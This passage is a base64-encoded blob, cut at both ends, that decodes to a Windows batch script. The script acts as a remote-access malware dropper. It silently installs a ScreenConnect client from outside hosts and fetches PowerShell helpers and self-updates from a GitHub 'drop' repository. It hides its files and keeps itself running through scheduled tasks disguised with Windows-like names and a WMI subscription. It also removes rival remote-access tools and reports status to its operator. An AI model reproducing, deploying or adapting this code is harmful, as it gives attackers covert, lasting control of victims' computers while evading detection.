aW4vb3duX2xpYi5wczE/dD0lUkFORE9NJSVSQU5ET00lIgpzZXQgIk9XTkxJQjI9aHR0cHM6Ly9j
ZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4vb3duX2xpYi5wczE/
dD0lUkFORE9NJSVSQU5ET00lIgpzZXQgIk1TSV9VUkw9aHR0cHM6Ly91aS5zZXZyei5jb20vQmlu
L1NjcmVlbkNvbm5lY3QuQ2xpZW50U2V0dXAubXNpP2U9QWNjZXNzJnk9R3Vlc3QiCnNldCAiTVNJ
X1BLRzE9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1k
cm9wL21haW4vcGtnLm1zaSIKc2V0ICJNU0lfUEtHMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQv
Z2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9wa2cubXNpIgpzZXQgIk1TST0lUHJvZ3JhbURh
dGElXFNjcmVlbkNvbm5lY3QuQ2xpZW50U2V0dXAubXNpIgpzZXQgIk1TSUNBQ0hFPSVXRCVccGtn
Lm1zaSIKCmlmIG5vdCBleGlzdCAiJVdEJSIgbWQgIiVXRCUiIDI+bnVsCmlmIG5vdCBleGlzdCAi
JUxPRyUiIHR5cGUgbnVsPiIlTE9HJSIgMj5udWwKCnNldCAiTU9OVkVSPU0yNCIKc2V0ICJQRjg2
PSVQcm9ncmFtRmlsZXMoeDg2KSUiCmZvciAvZiAidG9rZW5zPTEtMyBkZWxpbXM9LyAiICUlYSBp
biAoIiVkYXRlJSIpIGRvIHNldCAiRFQ9JWRhdGUlICV0aW1lJSIKZWNoby4+PiIlTE9HJSIKZWNo
byDilIDilIAgdGljayAhRFQhIFt2ZXIgJU1PTlZFUiVdIOKUgOKUgD4+IiVMT0clIgpzZXQgIkNP
VU5UPTAiCnNldCAiSU5TVEFMTEVEPTAiCnNldCAiUFJJTV9PSz0wIgpzZXQgIkFMVF9PSz0wIgpz
ZXQgIkZPUkVJR05fTEVGVD0wIgpzZXQgIkZPUkVJR05fTElTVD0iCnNldCAiTVNJRVhJVD1ub3Qt
cnVuIgoKcmVtIOKUgOKUgCBbMF0gc2luZ2xlLWZsaWdodCBtdXRleCAoc3RvcCBvdmVybGFwcGlu
ZyB0aWNrcyByYWNpbmcgbXNpZXhlYykg4pSA4pSACnNldCAiTVVURVg9JVdEJVx0aWNrLmxvY2si
CmlmIGV4aXN0ICIlTVVURVglIiAoCiAgZm9yICUlQSBpbiAoIiVNVVRFWCUiKSBkbyBzZXQgIkxP
Q0tBR0U9JSV+dEEiCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29t
bWFuZCAiaWYoKFRlc3QtUGF0aCAnJU1VVEVYJScpIC1hbmQgKCgoR2V0LURhdGUpLShHZXQtSXRl
bSAtTGl0ZXJhbFBhdGggJyVNVVRFWCUnIC1Gb3JjZSkuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51
dGVzIC1sdCA4KSl7IGV4aXQgMSB9IGVsc2UgeyBleGl0IDAgfSIgPm51bCAyPiYxCiAgaWYgZXJy
b3JsZXZlbCAxICgKICAgIGVjaG8gdGlja19za2lwcGVkX211dGV4X2J1c3k+PiIlTE9HJSIKICAg
IGVuZGxvY2FsCiAgICBleGl0IC9iIDAKICApCikKZWNobyAlREFURSUgJVRJTUUlICVSQU5ET00l
PiIlTVVURVglIgoKcmVtIOKUgOKUgCBwZXItaG9zdCBpZGVudGl0eSAoYW50aS1zaWduYXR1cmUp
IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgAppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAt
Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
JVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBpbml0IC1Xb3JrRGlyICIlV0QlIiA+bnVsIDI+JjEK
aWYgZXhpc3QgIiVXRCVcaWRlbnRpdHkuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCog
ZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcaWRlbnRpdHkuY2ZnIikgZG8gc2V0ICIlJUs9JSVMIgpp
ZiBub3QgZGVmaW5lZCBUQVNLX0Egc2V0ICJUQVNLX0E9V2VyUXVldWVTeW5jIgppZiBub3QgZGVm
aW5lZCBUQVNLX0Igc2V0ICJUQVNLX0I9UGxhU2VydmVySGVhbHRoIgppZiBub3QgZGVmaW5lZCBU
QVNLX0Mgc2V0ICJUQVNLX0M9V2RpSG9zdFByb3h5IgppZiBub3QgZGVmaW5lZCBUQVNLX0Qgc2V0
ICJUQVNLX0Q9VGNwSXBDb25mbGljdFJlcyIKaWYgbm90IGRlZmluZWQgTU9fQSBzZXQgIk1PX0E9
MiIKaWYgbm90IGRlZmluZWQgTU9fQiBzZXQgIk1PX0I9MyIKCnJlbSDilIDilIAgW0FdIGF1dG8t
dXBkYXRlIGNvcmUgZmlsZXMgKGJlc3QgZWZmb3J0KSDilIDilIDilIDilIDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKaWYgbm90IGV4aXN0ICIlQ1VSTCUiIHNldCAi
Q1VSTD1jdXJsLmV4ZSIKIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1l
b3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVx0Z19yZXBvcnQubmV3IiAiJVRHJSIgPm51bCAy
PiYxCmlmIG5vdCBleGlzdCAiJVdEJVx0Z19yZXBvcnQubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5l
Y3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcdGdfcmVwb3J0Lm5ldyIgIiVURzIl
IiA+bnVsIDI+JjEKYXR0cmliIC1oIC1zIC1yICIlV0QlXHRnX3JlcG9ydC5wczEiID5udWwgMj4m
MQpmaW5kc3RyIC9DOiJUR19SRVBPUlQgQlVJTEQiICIlV0QlXHRnX3JlcG9ydC5uZXciID5udWwg
Mj4mMSAmJiBmb3IgJSVGIGluICgiJVdEJVx0Z19yZXBvcnQubmV3IikgZG8gaWYgJSV+ekYgR1RS
IDE1MDAgbW92ZSAveSAiJVdEJVx0Z19yZXBvcnQubmV3IiAiJVdEJVx0Z19yZXBvcnQucHMxIiA+
bnVsIDI+JjEKZGVsIC9mIC9xICIlV0QlXHRnX3JlcG9ydC5uZXciID5udWwgMj4mMQoiJUNVUkwl
IiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDMwIC1v
ICIlV0QlXG93bl9zZWN1cmUubmV3IiAiJU9XTlNFQyUiID5udWwgMj4mMQppZiBub3QgZXhpc3Qg
IiVXRCVcb3duX3NlY3VyZS5uZXciICIlQ1VSTCUiIC1MIC0tY29ubmVjdC10aW1lb3V0IDggLS1t
YXgtdGltZSAzMCAtbyAiJVdEJVxvd25fc2VjdXJlLm5ldyIgIiVPV05TRUMyJSIgPm51bCAyPiYx
CmF0dHJpYiAtaCAtcyAtciAiJVdEJVxvd25fc2VjdXJlLmNtZCIgPm51bCAyPiYxCmZpbmRzdHIg
L0M6Ik9XTl9TRUNVUkUgQlVJTEQiICIlV0QlXG93bl9zZWN1cmUubmV3IiA+bnVsIDI+JjEgJiYg
Zm9yICUlRiBpbiAoIiVXRCVcb3duX3NlY3VyZS5uZXciKSBkbyBpZiAlJX56RiBHVFIgODAwIG1v
dmUgL3kgIiVXRCVcb3duX3NlY3VyZS5uZXciICIlV0QlXG93bl9zZWN1cmUuY21kIiA+bnVsIDI+
JjEKZGVsIC9mIC9xICIlV0QlXG93bl9zZWN1cmUubmV3IiA+bnVsIDI+JjEKIiVDVVJMJSIgLUwg
LS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdE
JVxvd25fbGliLm5ldyIgIiVPV05MSUIlIiA+bnVsIDI+JjEKaWYgbm90IGV4aXN0ICIlV0QlXG93
bl9saWIubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAg
LW8gIiVXRCVcb3duX2xpYi5uZXciICIlT1dOTElCMiUiID5udWwgMj4mMQphdHRyaWIgLWggLXMg
LXIgIiVXRCVcb3duX2xpYi5wczEiID5udWwgMj4mMQpmaW5kc3RyIC9DOiJPV05fTElCICBCVUlM
RCIgIiVXRCVcb3duX2xpYi5uZXciID5udWwgMj4mMSAmJiBmb3IgJSVGIGluICgiJVdEJVxvd25f
bGliLm5ldyIpIGRvIGlmICUlfnpGIEdUUiAxNTAwIG1vdmUgL3kgIiVXRCVcb3duX2xpYi5uZXci
ICIlV0QlXG93bl9saWIucHMxIiA+bnVsIDI+JjEKZGVsIC9mIC9xICIlV0QlXG93bl9saWIubmV3
IiA+bnVsIDI+JjEKcmVtIHNlbGYtdXBkYXRlOiBkb3dubG9hZCBuZXcgb3duX21vbiwgYXBwbHkg
QUZURVIgdGhpcyB0aWNrIChCVUlMRC12ZXJpZmllZCkKc2V0ICJTRUxGX1VQRD0wIgoiJUNVUkwl
IiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1v
ICIlV0QlXG93bl9tb24ubmV4dCIgIiVPV05NT04lIiA+bnVsIDI+JjEKaWYgbm90IGV4aXN0ICIl
V0QlXG93bl9tb24ubmV4dCIgIiVDVVJMJSIgLUwgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10
aW1lIDQwIC1vICIlV0QlXG93bl9tb24ubmV4dCIgIiVPV05NT04yJSIgPm51bCAyPiYxCmZpbmRz
dHIgL0M6Ik9XTl9NT04gIEJVSUxEIiAiJVdEJVxvd25fbW9uLm5leHQiID5udWwgMj4mMQppZiBu
b3QgZXJyb3JsZXZlbCAxIGZvciAlJUYgaW4gKCIlV0QlXG93bl9tb24ubmV4dCIpIGRvIGlmICUl
fnpGIEdUUiAxNTAwICgKICBmYyAvYiAiJVdEJVxvd25fbW9uLm5leHQiICIlV0QlXG93bl9tb24u
Y21kIiA+bnVsIDI+JjEKICBpZiBlcnJvcmxldmVsIDEgc2V0ICJTRUxGX1VQRD0xIgopCmlmICIl
U0VMRl9VUEQlIj09IjAiIGRlbCAvZiAvcSAiJVdEJVxvd25fbW9uLm5leHQiID5udWwgMj4mMQoK
cmVtIOKUgOKUgCBbQl0gcmUtYXJtIGNoYWluIDE6IG93bmVyc2hpcC1hd2FyZSAobm90IGV4aXN0
ZW5jZS1vbmx5KSDilIDilIAKcmVtIEwxMS9NMjI6IFF1ZXJ5LW9ubHkgc2tpcHBlZCByZWFybSB3
aGVuIFdpbmRvd3MgYnVpbHQtaW4gdGFza3Mgc2hhcmVkCnJlbSBkZWZhdWx0IG5hbWVzIChEaWFn
bm9zaXNcU2NoZWR1bGVkIGV0Yy4pIC0+IG1vbiBuZXZlciByYW4sIG5vIGxvZy4KaWYgZXhpc3Qg
IiVXRCVcb3duX2xpYi5wczEiICgKICBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAo
YHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBC
eXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gdGFza3MtZW5zdXJlIC1Xb3Jr
RGlyICIlV0QlIiAtTW9uUGF0aCAiJVdEJVxvd25fbW9uLmNtZCJgKSBkbyAoCiAgICBlY2hvIHRh
c2tzX2Vuc3VyZSAlJVI+PiIlTE9HJSIKICAgIHNldCAiVEFTS1NfRU5TVVJFPSUlUiIKICApCikK
aWYgbm90IGV4aXN0ICIlRVRMJSIgbWtkaXIgIiVFVEwlIiA+bnVsIDI+JjEKaWYgZXhpc3QgIiVX
RCVcb3duX21vbi5jbWQiICgKICBhdHRyaWIgLWggLXMgLXIgIiVFVEwlXGV0bF9tb24uY21kIiA+
bnVsIDI+JjEKICBjb3B5IC95ICIlV0QlXG93bl9tb24uY21kIiAiJUVUTCVcZXRsX21vbi5jbWQi
ID5udWwgMj4mMQopCgpyZW0g4pSA4pSAIFtCMl0gcmUtYXJtIGNoYWluIDIgKFdNSSBzdWJzY3Jp
cHRpb24pIGlmIG1pc3Npbmcg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACmlmIGV4aXN0ICIl
V0QlXG93bl9saWIucHMxIiAoCiAgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBw
b3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlw
YXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHdhdGNoZG9nLWVuc3VyZSAtV29y
a0RpciAiJVdEJSIgLU1vblBhdGggIiVXRCVcb3duX21vbi5jbWQiYCkgZG8gc2V0ICJXRF9TVEFU
RT0lJVIiCiAgaWYgL0kgIiFXRF9TVEFURSEiPT0iUkVBUk1FRCIgZWNobyB3YXRjaGRvZyBXTUkg
UkVBUk1FRD4+IiVMT0clIgopCgpyZW0g4pSA4pSAIFtFXSBleHRlcm1pbmF0ZSBmb3JlaWduIFND
ICsgZGlzYWxsb3dlZCBSTU0gKEJFRk9SRSBoZWFsL2luc3RhbGwsCnJlbSAgICAgc28gdGhlIFND
IGluc3RhbGxlciBjdXN0b20gYWN0aW9uIG5ldmVyIGNvbGxpZGVzIHdpdGggcml2YWxzKSDilIDi
lIAKaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9u
SW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5w
czEiIC1BY3Rpb24gZXh0ZXJtaW5hdGUgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxCnRp
bWVvdXQgL3QgOCAvbm9icmVhayA+bnVsCnNldCAiRk9SRUlHTl9MRUZUPTAiCmZvciAvZiAidG9r
ZW5zPTIgZGVsaW1zPSgpIiAlJWEgaW4gKCdzYyBxdWVyeSBzdGF0ZV49IGFsbCBefCBmaW5kc3Ry
IC9DOiJTRVJWSUNFX05BTUU6IFNjcmVlbkNvbm5lY3QgQ2xpZW50IicpIGRvICgKICBzZXQgIkZQ
PSUlYSIKICBzZXQgIkZQPSFGUDogPSEiCiAgaWYgL0kgbm90ICIhRlAhIj09IiVLRUVQX0ZQJSIg
aWYgL0kgbm90ICIhRlAhIj09IiVBTFRfRlAlIiAoCiAgICBzZXQgL2EgQ09VTlQrPTEKICAgIHNl
dCAvYSBGT1JFSUdOX0xFRlQrPTEKICAgIHNldCAiRk9SRUlHTl9MSVNUPSFGT1JFSUdOX0xJU1Qh
IUZQISAiCiAgICBlY2hvIGZvcmVpZ25fbGVmdF8hRlAhPj4iJUxPRyUiCiAgKQopCgpyZW0g4pSA
4pSAIFtDXSBoZWFsIFNjcmVlbkNvbm5lY3QgcHJpbS9hbHQg4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSACmZvciAvZiAidG9rZW5zPTEsMiBkZWxpbXM9KCkiICUlYSBpbiAoJ3NjIHF1ZXJ5ICJT
Y3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgXnwgZmluZHN0ciAvQzoiU0VSVklDRV9O
QU1FIicpIGRvICgKICBzZXQgIklOU1RBTExFRD0xIgogIHNldCAiUFJJTVNUQVRFPSUlYiIKKQpz
YyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklO
RyIgPm51bAppZiBub3QgZXJyb3JsZXZlbCAxICgKICBzZXQgIlBSSU1fT0s9MSIKICBzZXQgL2Eg
Q09VTlQrPTEKKQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51
bCAyPiYxCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0IC9hIENPVU5UKz0xCnNjIHF1ZXJ5ICJTY3Jl
ZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwKaWYgbm90
IGVycm9ybGV2ZWwgMSBzZXQgIkFMVF9PSz0xIgoKaWYgIiVJTlNUQUxMRUQlIj09IjEiIGlmICIl
UFJJTV9PSyUiPT0iMCIgKAogIGVjaG8gc3ZjIGhlYWwgcmVzdGFydD4+IiVMT0clIgogIG5ldCBz
dGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQogIHNjIHN0
YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgPm51bCAyPiYxCiAgdGltZW91
dCAvdCA2IC9ub2JyZWFrID5udWwKICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVL
RUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bAogIGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0
ICJQUklNX09LPTEiCikKcmVtIE0xNjogc3RpbGwgc3RvcHBlZCAtPiByZXBhaXIgdGhlIFJFR0lT
VEVSRUQgcHJvZHVjdCAobXNpZXhlYyAvZmEgcmVzdG9yZXMKcmVtIGJpbmFyaWVzICsgc3RhcnRz
IHRoZSBzZXJ2aWNlOyBMNSBSZXBhaXItU0NTZXJ2aWNlIGhhbmRsZXMgc3RvcHBlZCBzdmNzKQpp
ZiAiJUlOU1RBTExFRCUiPT0iMSIgaWYgIiVQUklNX09LJSI9PSIwIiAoCiAgZWNobyBzdmMgZXNj
YWxhdGUgcmVwYWlyPj4iJUxPRyUiCiAgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vy
c2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3Mg
LUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJUtFRVBfRlAlIiAt
V29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjEKICB0aW1lb3V0IC90IDggL25vYnJlYWsgPm51
bAogIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJS
VU5OSU5HIiA+bnVsCiAgaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIlBSSU1fT0s9MSIKKQpyZW0g
TTE2OiBvcnBoYW5lZCBzZXJ2aWNlIGVudHJ5IChwcm9kdWN0IHVucmVnaXN0ZXJlZCAtIGVhdGVu
IGJ5IGFuIFNDLWZhbWlseQpyZW0gdXBncmFkZSByZW1vdmFsKSBjYW4gTkVWRVIgc3RhcnQuIERl
bGV0ZSBpdCBhbmQgZmFsbCB0aHJvdWdoIHRvIHRoZQpyZW0gZnJlc2gtaW5zdGFsbCBsYWRkZXIg
YmVsb3cgaW5zdGVhZCBvZiBhbGVydGluZyAid29udCBzdGFydCIgZm9yZXZlci4KaWYgIiVJTlNU
QUxMRUQlIj09IjEiIGlmICIlUFJJTV9PSyUiPT0iMCIgKAogIHNldCAiUkVHU1RBVEU9dW5rbm93
biIKICBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgZm9yIC9mICJkZWxpbXM9IiAlJVIgaW4g
KCdwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kg
QnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlZ2lzdGVyZWQgLUZwICIl
S0VFUF9GUCUiIC1Xb3JrRGlyICIlV0QlIicpIGRvIHNldCAiUkVHU1RBVEU9JSVSIgogIGVjaG8g
b3JwaGFuX2NoZWNrPSFSRUdTVEFURSE+PiIlTE9HJSIKICBpZiAvSSAiIVJFR1NUQVRFISI9PSJu
byIgKAogICAgZWNobyBvcnBoYW5fc2VydmljZV9kZWxldGU+PiIlTE9HJSIKICAgIHNjIGRlbGV0
ZSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQogICAgc2V0ICJJ
TlNUQUxMRUQ9MCIKICApCikKaWYgIiVJTlNUQUxMRUQlIj09IjEiIGlmICIlUFJJTV9PSyUiPT0i
MCIgKAogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBv
bGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtE
aXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgInN2Yy13b250LXN0YXJ0IiA+bnVsIDI+
JjEKICBjYWxsIDpUZ1N0YXRlIERPV04gIlNjcmVlbkNvbm5lY3QgKCVLRUVQX0ZQJSkgaW5zdGFs
bGVkIGJ1dCB3b250IHN0YXJ0IgogIGdvdG8gOkFmdGVySGVhbAopCmlmICIlSU5TVEFMTEVEJSI9
PSIxIiBnb3RvIDpBZnRlckhlYWwKCnJlbSDilIDilIAgW0RdIHByaW1hcnkgU0MgbWlzc2luZyAt
IGhlYWwgbGFkZGVyIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgApyZW0gTTEyOiBGSVJTVCByZXBhaXIgdGhlIHJlZ2lzdGVy
ZWQgcHJvZHVjdCAocmVjcmVhdGVzIHNlcnZpY2Ugd2l0aG91dApyZW0gdG91Y2hpbmcgdGhlIEFM
VCBpbnN0YW5jZSk7IGZyZXNoIG1zaWV4ZWMgaW5zdGFsbCBvbmx5IGFzIGZhbGxiYWNrLgplY2hv
IHN2YyBtaXNzaW5nIC0gaGVhbCBiZWdpbj4+IiVMT0clIgpjYWxsIDpSZXBhaXJSZWdpc3RlcmVk
ICIlS0VFUF9GUCUiCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIg
fCBmaW5kICJSVU5OSU5HIiA+bnVsCmlmIG5vdCBlcnJvcmxldmVsIDEgKAogIHNldCAiSU5TVEFM
TEVEPTEiCiAgc2V0ICJQUklNX09LPTEiCiAgZ290byA6QWZ0ZXJIZWFsCikKcmVtIHJlZnVzZSBm
cmVzaCAvaSBpZiBwcm9kdWN0IHN0aWxsIHJlZ2lzdGVyZWQgLSBVcGdyYWRlIHRhYmxlIGNhbiB3
aXBlIEFMVApzZXQgIlJFR1NUQVRFPXVua25vd24iCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMx
IiBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmls
ZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3du
X2xpYi5wczEiIC1BY3Rpb24gcmVnaXN0ZXJlZCAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVX
RCUiYCkgZG8gc2V0ICJSRUdTVEFURT0lJVIiCmlmIC9JICIhUkVHU1RBVEUhIj09InllcyIgKAog
IGVjaG8gcHJpbWFyeV9yZWdpc3RlcmVkX3NraXBfZnJlc2hfaW5zdGFsbD4+IiVMT0clIgogIHBv
d2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBh
c3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUi
IC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgInJlZ2lzdGVyZWQtc3R1Y2siID5udWwgMj4mMQogIGNh
bGwgOlRnU3RhdGUgRE9XTiAiUHJpbWFyeSByZWdpc3RlcmVkIGJ1dCBzZXJ2aWNlIG1pc3Npbmcg
LSAvZmEgZmFpbGVkOyByZWZ1c2VkIC9pIHRvIHByb3RlY3QgQUxUIgogIGdvdG8gOkFmdGVySGVh
bAopCmlmICIlSU5TVEFMTEVEJSI9PSIwIiBjYWxsIDpJbnN0YWxsTXNpICIlTVNJX1VSTCUiICJt
YWluIgppZiAiJUlOU1RBTExFRCUiPT0iMCIgY2FsbCA6SW5zdGFsbE1zaSAiJU1TSV9QS0cxJT90
PSVSQU5ET00lIiAiZ2l0aHViLXBrZyIKaWYgIiVJTlNUQUxMRUQlIj09IjAiIGNhbGwgOkluc3Rh
bGxNc2kgIiVNU0lfUEtHMiUiICJqc2RlbGl2ci1wa2ciCmlmICIlSU5TVEFMTEVEJSI9PSIwIiAo
CiAgcmVtIHByZWZlciB3b3JrZXItY2FjaGVkIC53dWNhY2hlXHBrZy5tc2kgKHNhbWUgYmluYXJ5
IGFzIGRlcGxveSkKICBhdHRyaWIgLWggLXMgLXIgIiVNU0lDQUNIRSUiID5udWwgMj4mMQogIGZv
ciAlJUYgaW4gKCIlTVNJQ0FDSEUlIikgZG8gaWYgJSV+ekYgR1RSIDEwMDAwMDAgKAogICAgZWNo
byB3dWNhY2hlX3BrZ19yZXRyeT4+IiVMT0clIgogICAgYXR0cmliIC1oIC1zIC1yICIlTVNJJSIg
Pm51bCAyPiYxCiAgICBjb3B5IC95ICIlTVNJQ0FDSEUlIiAiJU1TSSUiID5udWwgMj4mMQogICkK
ICBmb3IgJSVGIGluICgiJU1TSSUiKSBkbyBpZiAlJX56RiBHVFIgMTAwMDAwMCAoCiAgICBlY2hv
IGNhY2hlIHJldHJ5IGluc3RhbGw+PiIlTE9HJSIKICAgIGNhbGwgOk5vTXNpUG9saWN5CiAgICBt
c2lleGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5
U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lfaGVhbC5sb2ciID5udWwgMj4mMQogICAgc2V0ICJNU0lF
WElUPSFFUlJPUkxFVkVMISIKICAgIGVjaG8gY2FjaGUgbXNpZXhlYyBleGl0PSFNU0lFWElUIT4+
IiVMT0clIgogICAgaWYgIiFNU0lFWElUISI9PSIxNjE4IiAoCiAgICAgIHRpbWVvdXQgL3QgMzAg
L25vYnJlYWsgPm51bAogICAgICBtc2lleGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jlc3RhcnQgQUxM
VVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lfaGVhbDIubG9nIiA+
bnVsIDI+JjEKICAgICAgc2V0ICJNU0lFWElUPSFFUlJPUkxFVkVMISIKICAgICAgZWNobyBjYWNo
ZV9yZXRyeTE2MThfZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSIKICAgICkKICAgIGNhbGwgOldhaXRT
dmMKICApCikKY2FsbCA6UmVzdG9yZUFsdAppZiAiJUlOU1RBTExFRCUiPT0iMCIgKAogIGlmIGV4
aXN0ICIlV0QlXG1zaV9oZWFsLmxvZyIgKAogICAgZWNobyAtLS0gbXNpX2hlYWwubG9nIHRhaWwg
LS0tPj4iJUxPRyUiCiAgICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1D
b21tYW5kICJHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJyVXRCVcbXNpX2hlYWwubG9nJyAtVGFp
bCAxMCIgPj4iJUxPRyUiIDI+JjEKICApCiAgaWYgbm90IGRlZmluZWQgTVNJRVhJVCBzZXQgIk1T
SUVYSVQ9ZmV0Y2gtZmFpbCIKICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZl
IC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9u
IHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJtc2ktZmFpbGVk
IiA+bnVsIDI+JjEKICBjYWxsIDpUZ1N0YXRlIEZBSUwgIk1TSSBpbnN0YWxsIGZhaWxlZCBvbiBh
bGwgc291cmNlcyAobXNpZXhlYyBleGl0ICVNU0lFWElUJSkiCikgZWxzZSAoCiAgZWNobyBzdmMg
cmVzdG9yZWQ+PiIlTE9HJSIKICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZl
IC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9u
